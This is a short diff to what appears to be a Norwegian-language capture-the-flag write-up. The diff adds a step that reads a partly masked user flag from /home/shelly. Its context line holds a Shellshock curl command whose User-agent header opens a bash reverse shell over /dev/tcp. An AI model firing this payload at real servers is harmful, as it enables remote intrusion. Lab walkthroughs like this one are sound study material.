@@ -54,3 +54,10 @@ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.56/1234 0>&1
 Og vi har shell!
 <p>
 <img src="shell.png">
+<p>
+Vi får user flag i /home/shelly.
+  
+```
+cat user.txt
+2ec24e11320026xxxxxxxxxx
+```
